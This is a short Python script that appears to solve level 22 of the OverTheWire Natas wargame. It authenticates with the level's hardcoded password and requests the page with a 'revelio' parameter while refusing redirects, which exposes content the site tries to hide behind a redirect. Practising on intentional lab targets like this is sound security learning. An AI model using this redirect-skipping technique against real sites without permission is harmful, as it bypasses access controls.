#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas22'
password = '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s'

url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % username

session = requests.Session()

response = session.get(url, auth=(username, password), allow_redirects = False)


content = response.text
print(content)